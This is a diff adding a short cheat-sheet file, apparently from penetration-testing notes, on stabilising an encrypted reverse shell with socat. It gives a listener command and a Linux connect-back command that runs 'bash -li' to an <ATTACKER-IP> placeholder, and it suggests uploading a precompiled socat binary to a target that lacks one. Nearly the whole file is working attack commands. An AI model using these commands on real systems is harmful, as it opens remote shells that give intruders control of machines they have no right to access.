@@ -1,0 +1,15 @@
+====================================================================
+FILE:'tty' method stabilizes the shell This will only work when the target is Linux for stabilization
+====================================================================
+1) Listener:
+
+$ socat OPENSSL-LISTEN:<PORT>,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0 -->This Listener is for either linux or Windows
+
+2) Connecting back with:
+
+$ socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 Exec:"bash -li",pty,stderr,sigint,setsid,sane --> this is for Linux
+
+
+***Please note that the certificate must be used on whichever device is listening.
+***The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary(https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
+====================================================================
